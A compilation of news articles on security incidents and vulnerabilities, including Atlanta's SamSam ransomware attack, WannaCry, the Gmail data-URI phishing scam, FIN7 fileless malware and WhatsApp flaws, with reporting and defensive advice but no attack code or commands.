In other cases, an attacker may even provide a fake app store that resembles Google Play. Alternately, a message supposedly from a friend sent via social media may lead to a malicious app. Disabling the “Allow installation of apps from unknown sources” setting prevents apps inadvertently downloaded these ways from being installed. By default, this setting is set to off. Only turn it on if you know you are installing an app from a trusted third-party app store.
To carry out malicious behavior such as installing other apps on the user’s device without any user input and consent, or hiding icons and processes, an app needs device administrator privileges. Legitimate apps seldom require these; users should double check whenever an app asks for them. This is particularly true of games, which do not require device administrator privileges. A “game” asking for these privileges is likely to be malicious or a PUA.
Trend Micro solutions
Users should only install apps from the Google Play or trusted third-party app stores and use mobile security solutions such as Trend Micro™ Mobile Security to block threats from app stores before they can be installed and cause damage your device or data.
Enterprise users should consider a solution like Trend Micro™ Mobile Security for Enterprise. This includes device management, data protection, application management, compliance management, configuration provisioning, and other features so employers can balance privacy and security with the flexibility and added productivity of BYOD programs.

Google has come up with a fix for the phishing scam that affected users. A Chrome browser update, which has been rolling out since February, now issues a warning when you've landed on an page with the scam.
In your browser address bar, look out for ""not secure"" to the left of the address. Fortune reports that in the future, Google will present this warning and indicate unprotected sites more aggressively with a red triangle.
According to Satnam Narang, Senior Security Response Manager at Norton by Symantec, here's how the Gmail phishing scam works: You'll see an email in your inbox from one of your contacts who has already been hacked. The email looks like it contains an attachment. But if you look closely, as this Twitter user did, you'll notice that the image preview for the attachment looks slightly fuzzy. This is because there isn't actually an attachment, just an image designed to look like one.
If you click on the image you'll be directed to a page that looks like the standard Google sign-in page. If you log-in there, the damage is done: The hacker can read and download all of your emails and could also access accounts elsewhere.
In the past, you might have recognized a scam by the language in the email. But Narang says that there are reports that these hackers are sending emails that look realistic. In one school district, for example, team members received what looked like a copy of a practice schedule.
Still, there are things you can look out for to spot a fake. ""The best way to identify this attack is to look at the address bar. In this case, look for the words 'data:/text/html' at the beginning of the URL,"" Narang says. ""If you see this, close the browser tab and alert your friend that their account has been compromised.""
Narang also recommends setting up two-step verification for your Gmail account (find out how to do so here). And follow these rules for boosting your password strength.
In a statement about the attack, a Google spokesperson said, ""“We're aware of this issue and continue to strengthen our defenses against it. We help protect users from phishing attacks in a variety of ways, including: machine learning based detection of phishing messages, Safe Browsing warnings that notify users of dangerous links in emails and browsers, preventing suspicious account sign-ins, and more. Users can also activate two-step verification for additional account protection.”
Above all, think twice before clicking on something. We're starting to see more sophisticated scams, so being vigilant will only help you in the long-run.

City employees in Atlanta coming to work Friday morning were told not to turn on their computers and WiFi at the Atlanta airport was turned off due to a ransomware attack that hit municipal systems on Thursday.
As employees walked into city hall for work, they were handed a printed notice telling them to not use their computers until they were cleared by the municipal IT group, the Atlanta Journal Constitution reported.
At a news conference Friday afternoon, Atlanta chief operating officer Richard Cox said that the WiFi at Hartsfield–Jackson Atlanta International Airport had been disabled out of ""an abundance of caution.""
The city is still working on mitigating the ransomware and Mayor Keisha Lance Bottoms did not answer questions from reporters as to whether the attack had ended.
""What we want to make sure of is that we aren’t putting a Band-Aid on a gaping wound. We want to make sure that we take the appropriate steps,"" she said.
Atlanta doesn’t know who is behind the attack, the mayor said.
The good news is that while “this is a massive inconvenience to the city, it is not life and death,” she said. Police, fire and other vital services are still fully functional, Cox said. 
The attack hit early Thursday morning. Bottoms has repeatedly told employees they should monitor their bank accounts because city officials don’t yet know what information was compromised in the attack.
""Let's just assume that if your personal information is housed by the City of Atlanta, whether it be because you are a customer who goes online and pays your bills or any employee or even a retiree, we don't know the extent, so we just ask that you be vigilant,"" Bottoms said.
The ransomware is affecting applications that customers use to pay bills and access court-related information among other things, Bottoms said.
The attackers demanded the equivalent of $51,000 in digital currency to unlock the system. 
The city is working with the FBI and local law enforcement to investigate the attack, Cox said. While it has been a difficult two days, Atlanta will in the end prevail, he said.
""The city was around before computers were around, said Cox. ""We’ll rise from the ashes,"" he added

A hacker (or hacker group) known as The Dark Overlord (TDO) has leaked the first ten episodes of season 5 of the ""Orange Is The New Black"" show after two failed blackmail attempts, against Larson Studios and Netflix.
TDO is one of the most well-known figures in today's dwindling hacker landscape. He first appeared on the scene in late 2015 and made a name for himself by hacking healthcare organizations, stealing their data, and trying to extract ransoms from victims by threatening to release sensitive data to the public.
The hacker's online presence shrunk in the past few months, as many hoped he called it quits and moved on to other activities.
Last night, at around 22:00 UTC (17:00 ET), your reporter noticed the hacker posting links on his Twitter profile that linked to a Pastebin page, GitHub profile, and a Pirate Bay torrent sharing episode 1 of season 5 of Netflix's ""Orange Is The New Black"" show.
We didn't manage to get ahold of the Pastebin and GitHub links because they went down 20 minutes after they were posted, but we presume the links contained ransom demands. On the other hand, the Pirate Bay torrent file remained online, and users have downloaded and shared its content.
Twelve hours later, TDO posted a new set of links on Twitter. These included a statement posted on Pastebin and a second torrent file, also hosted on The Pirate Bay, containing episodes 2 through 10 of the same season 5 of ""Orange Is The New Black.""
In the Pastebin statement, TDO says he released the ten ""Orange Is The New Black"" episodes because Netflix didn't want to pay a ransom demand.
While we weren't able to get in touch with TDO after numerous attempts, the hacker spoke with the administrator of DataBreaches.net, a reporter named Dissent.
In their interview, TDO revealed he discovered ""hundreds of GBs of unreleased and non-public media,"" on the servers of a Hollywood studio. The hacker didn't clarify if the server was exposed accidentally, or if he hacked it.
DataBreaches.net identified the studio as Larson Studios, Inc., an audio post-production company, who later confirmed TDO's extortion attempt via email.
TDO claims the studio initially agreed to pay a ransom of 50 Bitcoin ($67,000) by January 31, and the two parties even signed a contract, albeit TDO signed it using the name ""Adolf Hitler.""
Something happened during the month of January, and the studio did not honor its word. At this point, the hacker turned from the studio to Netflix.
According to TDO's statement, Netflix didn't want to pay his ransom demand either, and after two months he was forced to release the first ten episodes of season 5 of ""Orange Is The New Black."" According to Netflix's website, season 5 is supposed to have 13 episodes and is scheduled for release in June, this year.
The release of these episodes is TDO's shot across the bow. The hacker claims to hold other unreleased shows and movies from several other studios.

SEATTLE — When malicious software first became a serious problem on the internet about 15 years ago, most people agreed that the biggest villain, after the authors of the damaging code, was Microsoft.
As a new cyberattack continues to sweep across the globe, the company is once again at the center of the debate over who is to blame for a vicious strain of malware demanding ransom from victims in exchange for the unlocking of their digital files.
This time, though, Microsoft believes others should share responsibility for the attack, an assault that targeted flaws in the Windows operating system.
On Sunday, Brad Smith, Microsoft’s president and chief legal officer, wrote a blog post describing the company’s efforts to stop the ransomware’s spread, including an unusual step it took to release a security update for versions of Windows that Microsoft no longer supports. Mr. Smith wrote, “As a technology company, we at Microsoft have the first responsibility to address these issues.”
He went on, though, to emphasize that the attack had demonstrated the “degree to which cybersecurity has become a shared responsibility between tech companies and customers,” the latter of whom must update their systems if they want to be protected. He also pointed his finger at intelligence services, since the latest vulnerability appeared to have been leaked from the National Security Agency.
On Monday, a Microsoft spokesman declined to comment beyond Mr. Smith’s post.

Microsoft has recognized the risk that cybersecurity poses to it since about 2002, when Bill Gates, the former chief executive, issued a call to arms inside the company after a wave of malicious software began infecting Windows PCs connected to the internet.
“As software has become ever more complex, interdependent and interconnected, our reputation as a company has in turn become more vulnerable,” Mr. Gates wrote in an email to employees identifying trustworthy computing as Microsoft’s top priority. “Flaws in a single Microsoft product, service or policy not only affect the quality of our platform and services overall, but also our customers’ view of us as a company.”
Since then, the company has poured billions of dollars into security initiatives, employing more than 3,500 engineers dedicated to security. In March, it released a software patch that addressed the vulnerability exploited by the ransomware, known as WannaCry, protecting systems such as Windows 10, its latest operating system.
Yet security flaws in older editions of Windows persist. The company no longer provides regular software updates to Windows XP, a version first released in 2001, unless customers pay for “custom support,” a practice some observers believe has put users at risk. Late Friday, Microsoft took the unusual step of making patches that protect older systems against WannaCry, including Windows XP, free.
“Companies like Microsoft should discard the idea that they can abandon people using older software,” Zeynep Tufekci, an associate professor at the school of information and library science at the University of North Carolina, wrote in a New York Times opinion piece over the weekend. “The money they made from these customers hasn’t expired; neither has their responsibility to fix defects.”
But security experts challenged that argument, saying that Microsoft could not be expected to keep updating old software products indefinitely. Providing updates to older systems could make computers more insecure by removing an incentive for users to modernize, Mikko Hypponen, the chief research officer of F-Secure, a security firm.
“I can understand why they issued an emergency patch for XP after WannaCry was found, but in general, we should just let XP die, ” Mr. Hypponen said.

An effective new phishing attack is hitting Gmail users and tricking many into inputing their credentials into a fake login page.
The phishers start by compromising a Gmail account, then they rifle through the emails the user has recently received.
After finding one with an attachment, they create an image (screenshot) of it and include it in a reply to the sender.
They use the same or similar subject line for the email, to invoke recognition and automatic trust.
“You click on the image, expecting Gmail to give you a preview of the attachment.
Instead, a new tab opens up and you are prompted by Gmail to sign in again,” WordFence CEO Mark Maunder warns.
The phishing page is a good copy of Gmail’s login page, and its URL contains the accounts.google.com subdomain, which is enough to fool many into believing that they are on a legitimate Google page.
“This phishing technique uses something called a ‘data URI’ to include a complete file in the browser location bar.
When you glance up at the browser location bar and see ‘data:text/html…..’ that is actually a very long string of text,” Maunder explained.

That’s what two security researchers are warning, after finding a Mac-based malware that may be an attempt by Iranian hackers to target the U.S. defense industry.
The fake site was previously used in a spear phishing email attack to spread Windows malware and is believed to be maintained by Iranian hackers, the researchers claimed.
Visitors to the site are greeted with a page about free programs and courses for employees of U.S. defense companies Lockheed Martin, Raytheon, and Boeing.
The malware itself can be downloaded from an Adobe Flash installer for a video embedded in the site.
The MacDownloader malware was designed to profile the victim's computer, and then steal credentials by generating fake system login boxes and harvesting them from Apple's password management system, Keychain.
However, the malware is of shoddy quality and is ""potentially a first attempt from an amateur developer,"" the researchers said.

Robert Gren was working from home on Friday when, all of a sudden, his laptop stopped working.
What he initially thought was just a kink in his computer’s software was in fact part of a global ransomware attack that has affected more than 200,000 computers and caused untold havoc from China to Britain.
Now, Mr. Gren and the thousands of other victims worldwide face an agonizing choice: either hand over the ransom — a figure that has climbed to $600 for each affected machine — by a deadline this Friday, or potentially lose their digital information, including personal photos, hospital patient records and other priceless data, forever.
“I’m pretty devastated,” said Mr. Gren, 32, a manager of an online entertainment business in Krakow, Poland, who has spent almost all of his waking hours since Friday looking for ways to reclaim his digital data. “I’ve lost private files that I have no other way of recovering. For me, the damage has been huge.”
That decision has become even more difficult as cybersecurity experts and law enforcement officials have repeatedly warned people against paying the ransom ahead of this week’s deadline.
Aside from dissuading victims from handing over money that may help fund further such attacks, they caution that it is not guaranteed the attackers will return control of people’s computers even if they pay the assailants in bitcoin, a digital currency favored in such ransomware attacks that can be difficult to trace.
Officials also note that the attackers, who have yet to been named, have provided only three bitcoin addresses — similar to a traditional bank routing number — for all global victims to deposit the ransom, so it may prove difficult to know who has paid the digital fees.
This haphazard planning has led many victims to hold off paying, at least until they can guarantee they will get their data back.
So far, roughly $80,000 has been deposited into the bitcoin addresses linked to the attack, according to Elliptic, a company that tracks online financial transactions involving virtual currencies.
F-Secure, a Finnish cybersecurity firm, has confirmed that some of the 200 individuals that it had identified, who had paid the ransom, had successfully had their files decrypted. Yet that represented a small fraction of those affected, and the company said it still remained unlikely that people would regain control of their computers if they paid the online fee.
The tally of ransom payments may rise ahead of Friday’s deadline, but cybersecurity experts say the current numbers — both total ransom money paid and machines decrypted — are far short of early estimates forecasting that the digital attack may eventually cost victims hundreds of millions of dollars in combined ransom fees.
“I predict this may be an epic failure,” said Kim Peretti, a former senior litigator in the Department of Justice’s computer crime and intellectual property division who now is co-chairwoman of the cybersecurity preparedness and response team at Alston & Bird, an international law firm. “Because of the publicity of this attack and the public’s awareness of people potentially not getting their files back, the figures aren’t as high as people had first thought.”
For victims of such attacks, the potential loss of personal or business files can be traumatic. In typical ransomware cases, including the most recent hack, assailants send an encrypted email to potential targets. The message includes a malware attachment that takes over their machines if opened. The attackers then demand payment before returning control of the computers, often through money paid into bitcoin or other largely untraceable online currencies.

Sucuri, the company that discovered the flaw and responsibly reported it to the WordPress security team, spotted four distinct defacement campaigns in the 48 hours after the existence of the bug was publicly revealed.
Three of them have had limited impact, but one – “signed” by someone that goes by “w4l3XzY3” – has resulted in the compromise of 86,000 pages and counting.
Sucuri CTO Daniel Cid expects the defacement campaigns to slow down in the coming days, only to be followed by SEO spam (Search Engine Poisoning) attempts.
“There’s already a few exploit attempts that try to add spam images and content to a post.
Due to the monetization possibilities, this will likely be the #1 route to abuse this vulnerability,” he noted.

The same group of hackers that intelligence officials believe swung the US election in favour of Donald Trump has also attacked Norwegian targets within the military and foreign service.
Called “Fancy Bear,” computer security experts believe Russia is behind the hacking that’s aimed at political manipulation and destablization of western democracies.
Norway’s foreign ministry has been among the targets of hackers, also abroad.
DN reported that the list of targets is long, including embassies and ministries in more than 40 countries, several NATO and EU institutions, political and military leaders, well-known journalists, activists and academics.
Most haven’t been aware they were attacked when they clicked on links in email that seemed to come from people they knew.
The attacks enabled the hackers to steal confidential information by penetrating email accounts and internal systems.
The attacks in Norway only make up 2 percent of attacks on military and political institutions, DN reported, but local authorities are on high alert for more.
The US’ FBI, CIA and NSA have all described the attacks as the largest Russian attempt to gain influence in the US ever.
Russian authorities from President Vladimir Putin’s office on down have vigorously denied they’re behind the hacking.
In addition to the attacks on foreign ministry and military interests, email accounts at Norway’s Greens Party (Miljøpartiet De Grønne, MDG) were hacked last June and the attacker gained access to the party’s membership register.
A few weeks later, Norway’s Socialist Left party (SV) was also attacked, with the hackers gaining access to SV’s membership register as well.
A false profile was established ono the party’s internal debate forum.
Both attacks remain under investigation, according to the Oslo Police District.
“It can seem that security is not good enough,” Grandhagen told DN, but it’s demanding and expensive for such organizations to fend off the hackers.
Norwegian political parties aren’t required by law to test their data systems for possible penetration.
“Information that should not or must never come out should never be sent via Hotmail or email that’s not classified,” Bernsen said.

A scareware campaign has been uncovered that pushes a ‘free’ VPN app called MyMobileSecure to iOS users via rogue ads on popular torrent sites.
The VPN app itself appears to be real—but researchers say its privacy policies are dubious, at best.
The first interesting thing is the malvertising campaign that’s pushing the app.
When using iPhone to visit certain sites, a pop-up page plays an ear-piercing beeping sound and claims the device is infected with viruses.
Tapping on ‘Remove Virus’ button opens up the App Store to download the app.
“Such alerts on mobile devices are not new and sadly commonplace via may ad networks these days,” said Malwarebytes researcher Jérôme Segura, in a blog.
“Usually, aggressive affiliates remunerated per lead will use these kinds of tactics to drive traffic to game apps or even tech support scams”.
In order to activate the free VPN app, users must join the MobileXpression research community.
“Often times, affiliates are not properly policed and we observe scare tactics to force the installation of various pieces of software,” Segura said.
“It’s important to note that those affiliates are normally distinct from the software vendors themselves, but scammy behaviors end up reflecting poorly on everyone”.
In this particular case, “one cannot help but feel that this VPN application comes with some serious baggage and unfortunately the average user will not take the time to review the fine details.
If the intent is to use a VPN to anonymize your online activities, this does almost the opposite,” he added.

The city has spent the past two weeks restoring online services disrupted by ransomware that held encrypted data hostage.
Soon after Atlanta City Auditor Amanda Noble logged onto her work computer the morning of March 22, she knew something was wrong. The icons on her desktop looked different—in some cases replaced with black rectangles—and she noticed many of the files on her desktop had been renamed with “weapologize” or “imsorry” extensions. Noble called the city’s chief information security officer to report the problem and left a message. Next, she called the help desk and was put on hold for a while. “At that point, I realized that I wasn’t the only one in the office with computer problems,” Noble says.
Those computer problems were part of a high-profile “ransomware” cyberattack on the City of Atlanta that has lasted nearly two weeks and has yet to be fully resolved. During that time the metropolis has struggled to recover encrypted data on employees’ computers and restore services on the municipal Web site. The criminals initially gave the city seven days to pay about $51,000 in the cryptocurrency bitcoin to get the decryption key for their data. That deadline came and went last week, yet several services remain offline, suggesting the city likely did not pay the ransom. City officials would not comment on the matter when contacted by Scientific American.
The Department of Watershed Management, for example, still cannot accept online or telephone payments for water and sewage bills, nor can the Department of Finance issue business licenses through its Web page. The Atlanta Municipal Court has been unable to process ticket payments either online or in person due to the outage and has had to reschedule some of its hearings. The city took down two of its online services voluntarily as a security precaution: the Hartsfield–Jackson Atlanta International Airport wi-fi network and the ability to process service requests via the city’s 311 Web site portal, according to Anne Torres, Atlanta’s director of communications. Both are now back online, with airport wi-fi restored Tuesday morning.
The ransomware used to attack Atlanta is called SamSam. Like most malicious software it typically enters computer networks through software whose security protections have not been updated. When attackers find vulnerabilities in a network, they use the ransomware to encrypt files there and demand payment to unlock them. Earlier this year attackers used a derivative of SamSam to lock up files at Hancock Regional Hospital in Greenfield, Ind. The health care institution paid nearly $50,000 to retrieve patient data. “The SamSam ransomware used to attack Atlanta is interesting because it gets into a network and spreads to multiple computers before locking them up,” says Jake Williams, founder of computer security firm Rendition Infosec. “The victim then has greater incentive to pay a larger ransom in order to regain control of that network of locked computers.”
The city’s technology department—Atlanta Information Management (AIM)—contacted local law enforcement, along with the FBI, Department of Homeland Security, Secret Service and independent forensic experts to help assess the damage and investigate the attack. The attackers set up an online payment portal for the city but soon took the site offline after a local television station published a screen shot of the ransom note, which included a link to the bitcoin wallet meant to collect the ransom.
Several clues indicate Atlanta likely did not pay the attackers, Williams says. “Ransomware gangs typically cut off communications once their victims get law enforcement involved,” he says. “Atlanta made it clear at a press conference soon after the malware was detected” that they had done so. The length of time it has taken to slowly bring services back online also suggests the cyber criminals abandoned Atlanta without decrypting the city’s files, Williams says. “If that’s the case, the city’s IT staff spent the past week rebuilding Atlanta’s online systems using backed-up data that had not been hit by the ransomware,” he says, adding that any data not backed up is likely “lost for good.”
“If the city had paid the ransom, I would have expected them to bring up systems more quickly than they have done,” says Justin Cappos, a professor of computer science and engineering at New York University’s Tandon School of Engineering. “Assuming the city did not pay the ransom, their ability to recover their systems at all shows that they at least did a good job backing up their data.”

Three appears to have made a blunder, after customers logging into the British mobile phone company’s website found themselves looking at other customers’ accounts - including the names, addresses, call histories and data usage of complete strangers.
The Guardian describes how one customer, Andy Fidler, found the Three app on his mobile phone wasn’t working - and so he decided to log into Three’s website instead:
“I managed to successfully download a complete stranger’s phone bill. All I did was click on the link to bring up my bill. It included the name, address, how much they were paying, the phone numbers they had rung and texted.”
Fortunately, bank details were not accessible.
He wasn’t the only one to stumble across the problem - which appears to be more of a technical screw-up than a malicious hack - as posts on Three’s official Facebook page reveal.
A Three spokesperson says that they are aware of the problem and are investigating.
But one has to wonder how many customers could have been put at risk of having their private data exposed, and for how long the problem has been present.
The Information Commissioner’s Office has confirmed it will be “looking into this potential incident involving Three”, and if they find the company has been sloppy with its securing customer details it is unlikely to be impressed.
Last November, in what appears to be an unconnected incident, Three revealed that its upgrade database had been breached, exposing the names, phone numbers, addresses and dates of birth of over 130,000 customers.

Adobe has resolved 11 security flaws in this month's patch update on the heels of a far larger security round last month in which over a hundred bugs were squashed.
The patch release impacts Adobe Flash, Acrobat and Reader, Experience Manager, and Creative Cloud. Two of the vulnerabilities disclosed in the release are described as critical and affect Acrobat and Reader.
In July, Adobe issued a security update which patched a total of 112 vulnerabilities. The majority of bugs were uncovered in Adobe Acrobat, but a critical code execution flaw was also resolved in Adobe Flash.
The critical bugs in this release impact Adobe Acrobat 2017, Acrobat DC, and Acrobat Reader DC on Windows and macOS machines. The tech giant says that exploitation of the security flaws, an out of bounds write issue (CVE-2018-12808) and an untrusted pointer dereference problem (CVE-2018-12799) can lead to arbitrary code execution.
The vulnerabilities resolved include five bugs in Adobe Flash. An out of bounds read flaw (CVE-2018-12824), a security bypass error (CVE-2018-12825), two information disclosure vulnerabilities (CVE-2018-12826, CVE-2018-12827), and a privilege escalation flaw (CVE-2018-12828) have all been patched.
A reflected cross-site scripting flaw (CVE-2018-12806), input validation bypass (CVE-2018-12807), and cross-site scripting (XSS) bug (CVE-2018-5005) have been patched in Adobe Experience Manager versions 6.0 -- 6.4 on all platforms.
If exploited, the security flaws can facilitate sensitive information disclosure and data modification.
In addition, a single bug in Adobe Creative Cloud Desktop affecting versions 4.5.0.324 and earlier versions on Windows systems has been resolved.
The DLL hijacking vulnerability (CVE-2018-5003) can be exploited in order for an attacker to escalate privileges on an account.
Adobe recommends that users update their software as quickly as possible. Researchers from Trend Micro's Zero Day Initiative, Palo Alto Networks, Google Project Zero, TenCent, and Cognizant Technology Solutions, among others, were thanked for reporting the bugs.
On Tuesday, Microsoft's latest round of patches tackled a total of 60 vulnerabilities, 19 of which were deemed critical.
Two severe security flaws resolved in the update are zero-day vulnerabilities which are being actively exploited in the wild.

Forcepoint security labs has identified a form of ransomware, first documented back in September 2016 that targets healthcare organisations.
‘Philadelphia’, believed to be a new version of ‘Stampedo’ currently shows patterns that could be the beginning of a widening targeting campaign, extending beyond US perimeters.
Sold for just a few hundred dollars and promoted on YouTube, it gives have-a-go criminals, on a global scale, the tools to conduct very targeted and convincing attacks.
The attack is sent through a spear-phishing email containing tailored logos and staff names, adding to the deception.
Once activated the variant communicates information including operating system, username, country and system code back to its command and control and generates a victim ID, bitcoin wallet ID and bitcoin ransom price.
Carl Leonard, principal security analyst at Forcepoint, said:
“While processing our open source intelligence feeds we discovered Philadelphia, currently a cheap, poorly written ransomware that is available cheaply to script kiddies.
Although the ransom is currently only 0.3 BTC, the command and control paths suggest that the actor is targeting hospitals for this campaign so there are likely to be other targets.

The average amount of a ransomware demand has increased from $294 in 2015 to $1,077 last year, according to a report released last week by Symantec.
""That's a pretty dramatic increase,"" said Kevin Haley, director of security response at Symantec.
""The bad guys can get almost anything they ask for,"" Haley said.
Some cybercriminals also adjust the size of the ransom demand to the type of victim, asking enterprises for significantly larger amounts of money than they do of consumers.
The company also surveyed ransomware victims, and found that 34 percent of people paid the ransom globally. But in the U.S., the number was 64 percent.
All this money coming in is bad news for cybersecurity professionals.
""We're seeing a lot more people investing in this business, because it's highly profitable and it's really easy to get into,"" he said. ""The end result is more malware, and more ransomware. The problem will continue getting worse.""
The Internet of Things was also a major topic in the report. Symantec operates an IoT honeypot, and the number of attacks nearly doubled over the course of 2016.
The intensity of attacks really surprised him, Haley said.
During peak activity, attacks would come in every two minutes. That means that vulnerable devices would get infected almost as soon as they are connected to the internet, he said. ""If you plug it in, and decide to take care of security later, you're already too late.""
There's no grace period.
""But if the device is not using a default password, is patched, and is up to date, it can fight off most of those attacks,"" he said. ""Unfortunately, we know that there are a lot of devices out there with default passwords, or simple passwords, or haven't been patched.""
The 77-page report also covered a wide variety of other security-related topics. One in 131 emails contained a malicious link or attachment, the highest rate in five years.

A WhatsApp security vulnerability could allow attackers to crash the iOS app as soon as you answer a call, and could potentially be used to hack your iPhone …
The Register reports that the flaw was reported to WhatsApp in August, and has been patched in the latest version – so you’ll want to check for an update.
Google Project Zero whizkid and Tamagotchi whisperer Natalie Silvanovich discovered and reported the flaw, a memory heap overflow issue, directly to WhatsApp in August. Now that a fix is out, Silvanovich can go public with details on the potentially serious flaw.
According to Silvanovich’s report, the bug is triggered when a user receives a malformed RTP packet, triggering the corruption error and crashing the application. In practice, the malformed packet that triggers the crash could be sent via a simple call request.
“This issue can occur when a WhatsApp user accepts a call from a malicious peer,” Silvanovich explained.
It’s not clear whether the WhatsApp security flaw could be exploited for remote code execution, but this is a possibility, and a sufficient risk for a fellow Google researcher to describe it as ‘a big deal.’
“This is a big deal,” tweeted Travis Ormandy. “Just answering a call from an attacker could completely compromise WhatsApp.”
The same vulnerability was present in the Android app, which has also been patched. The Register says it is still waiting to hear from Google on more details, for example whether the desktop app is similarly affected.
It’s not the first time of late that a WhatsApp security issue has been identified. Back in August, it was discovered that it was possible for an attacker to change both the content and the sender of a WhatsApp message after you’ve received it.

Morphisec researchers have spotted another attack campaign using fileless malware that is believed to be mounted by the infamous FIN7 hacking group. The goal of the campaign is to gain control of the target businesses’ systems, install a backdoor, and through it perform continual exfiltration of financial information.
“Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations,” the researchers noted. 
“The Word document executes a fileless attack that uses DNS queries to deliver the next shellcode stage (Meterpreter). However, in this new variant, all the DNS activity is initiated and executed solely from memory – unlike previous attacks which used PowerShell commands.”
The researchers attribute this one important change to the group’s efforts to stay one step ahead of the defenders, and they are succeeding: 
“After decryption of the second stage shellcode, the shellcode deletes the ‘MZ’ prefix from within a very important part of the shellcode. This prefix indicates it may be a DLL, and its deletion helps the attack to evade memory scanning solutions,” the researchers found.
“If this DLL was saved on disk, many security solutions would immediately identify it as a CobaltStrike Meterpreter, which is used by many attackers and pen testers.”
But it’s not, and it passes undetected.
In-memory resident attacks and the use of fileless malware are on the rise, and FIN7 is one group that has been employing this approach regularly. 
There can be no doubt other attackers will try to implement the same tactic.
FIN7 has previously been tied to a sophisticated spear-phishing campaign hitting US-based businesses with emails purportedly coming from the US Securities and Exchange Commission (SEC), and Morphisec researchers believe that the series of attacks leveraged against 140+ banks and other businesses earlier this year is also their work.
FIN7 is also associated with the infamous Carbanak gang, but whether they are one and the same it’s still impossible to say for sure.

Apple has posted the annual full overhaul of the Mac operating system, this time focusing on a redesign of the look and feel of the interface.
The 10.14 incarnation of macOS, known as Mojave, has been released into general availability. It includes new features, interface updates, and security patches – though at least one hole was left unpatched. 
Apple is touting a set of interface improvements with the update, most notably the addition of a ""Dark Mode"" color scheme option and a Dynamic Desktop background that changes the image with the time of day. In more useful features, there's the Stacks utility that organizes messy desktops by grouping files into categories.
Apple also added a set of new News, Stocks, Voice Memos, and Home applications for macOS, porting the tools from iOS, while the Mac Continuity Camera app will let users snap and share pictures from their iOS device. Apple also redesigned the macOS version of the App Store service.

Nestled into the Mojave update was a patch bundle that addresses more than a half-dozen security holes.
Mojave will include fixes for eight CVE-listed vulnerabilities. These include two remote code execution flaws in the kernel (CVE-2018-4336, CVE-2018-4344) and weak RC4 encryption (CVE-2016-1777). That '4344 flaw was discovered by eggheads at the UK government's eavesdropping nerve center, GCHQ.
Other flaws include a traffic intercept flaw in Bluetooth (CVE-2018-5383), a sandbox escape in the operation firewall (CVE-2018-4353), a restricted memory access flaw in Crash Reporter (CVE-2018-4333), and flaws in both Auto Unlock (CVE-2018-4321) and App Store (CVE-2018-4324) that would allow an attacker to access the user's Apple ID. 
Seemingly, these patches are only available for macOS 10.14 – however, previous versions of the operating system were fixed up last week.

It didn't take long for at least one researcher to blast holes in the security features of the new operating system. Shortly after Mojave arrived, macOS guru Patrick Wardle dropped word of a vulnerability he discovered that would allow an attacker to bypass the privacy safeguards in Mojave that would normally prevent an unauthorized app from accessing things like users' contact details. Here's a video of the exploit...
Wardle said he has reported the bug to Apple, but will not release details beyond the proof-of-concept video until a fix can be released. More technical details are due to be released in November.

Updated WhatsApp’s end-to-end encryption can be potentially exploited by determined snoops to intercept and read encrypted messages, it was claimed today.
Essentially, if an attacker can reroute a redelivered encrypted message, it is possible to decrypt the text.
Facebook-owned WhatsApp stresses this is not a serious flaw nor a deliberate backdoor in its code.
Users can detect and stop the surveillance, if it happens, by activating security notifications in the application's settings.
At the heart of the matter is the exchange of cryptographic keys when two people start chatting to each other: their public keys are sent through Facebook's servers, and ideally the two people need to verify outside of WhatsApp that their keys haven't been tampered with during the handover.
If it's not possible to verify the keys, or there isn't an opportunity to verify the keys, you're potentially open to man-in-the-middle surveillance.
For example, a snooper could stop a WhatsApp message from being sent, take over the recipient's phone number, trigger a public key exchange between the sender and the snooper's handset that's now using the recipient's hijacked number, receive the redelivered text before the sender has a chance to verify the new public key, and decrypt the message they're not supposed to read.
This is non-trivial to exploit and rather easy to detect when it happens, rendering it pointless.
The problem – which is ""endemic to public key cryptography"" – was raised in April last year, and at the time WhatsApp said it wasn't a serious enough design flaw to spend time fixing.
Now allegations that WhatsApp deliberate knackered its security have flared up again, this time reported in The Guardian.
In response, the Facebook-owned messaging service said it designed its app to redeliver messages as described above to allow texts to be sent in parts of the world where people frequently swap devices and SIM cards.
At WhatsApp, we’ve always believed that people’s conversations should be secure and private.
Last year, we gave all our users a better level of security by making every message, photo, video, file and call end-to-end encrypted by default.
As we introduce features like end-to-end encryption, we focus on keeping the product simple and take into consideration how it's used every day around the world.
In WhatsApp's implementation of the Signal Protocol, we have a “Show Security Notifications” setting (option under Settings > Account > Security) that notifies you when a contact's security code has changed.
We know the most common reasons this happens are because someone has switched phones or reinstalled WhatsApp.
This is because in many parts of the world, people frequently change devices and SIM cards.
In these situations, we want to make sure people's messages are delivered, not lost in transit.
The alleged weakness in WhatsApp’s encryption system was documented by Tobias Boelter, a cryptography and security researcher at the University of California, and branded a ""backdoor"" today in The Grauniad.
The paper fears governments can abuse the messenger app's design, which is based on Open Whisper's Signal protocol, to snoop on people's conversations.
Some infosec bods are critical of Facebook’s design decisions in rolling out its end-to-end encryption in WhatsApp.
Neil Cook, chief security architect at Open-Xchange, commented: “WhatsApp has already broken their promise not to share user data with Facebook, and now it seems that their promise of end-to-end encrypted messaging isn’t quite as secure as everyone had hoped, particularly given the involvement of Open Whisper Systems.
It’s worth noting that this error in the encryption protocol is not present in Signal, so the team at WhatsApp have made the change intentionally”.
Matthew Aldridge, solutions architect at Webroot, added: “This flaw allows Facebook/WhatsApp to intercept messages if they choose to, by having the sender’s software automatically flip across to a second encryption key.
The functionality is designed to create a seamless user experience for users who have connectivity issues or drop offline for a time during a conversation, but it has resulted in a situation where it could be used to intercept messages by WhatsApp.
For those sending highly sensitive messages, or simply looking to avoid this, you should switch on the key change warnings in settings, and always check that the two ticks appear after sending messages in an active conversation”.
Others fault Facebook for failing to respond quickly enough.
Jacob Ginsberg, senior director at Echoworx, an expert in end-to-end messaging encryption, said: “The fact that Facebook has known about this vulnerability since April is doubly damming.
Not only could this be seen by many as supporting on-going government data collection interventions, it means their talk of encryption and privacy has been nothing more than lip service.
The company needs to actively address its security measures”.
®
In a follow-up statement, WhatsApp denied accusations that it had inserted what amounted to a backdoor in its messaging code:
The Guardian posted a story this morning claiming that an intentional design decision in WhatsApp that prevents people from losing millions of messages is a “backdoor” allowing governments to force WhatsApp to decrypt message streams.
WhatsApp does not give governments a “backdoor” into its systems and would fight any government request to create a backdoor.
The design decision referenced in the Guardian story prevents millions of messages from being lost, and WhatsApp offers people security notifications to alert them to potential security risks.
WhatsApp published a technical white paper on its encryption design, and has been transparent about the government requests it receives, publishing data about those requests in the Facebook Government Requests Report.
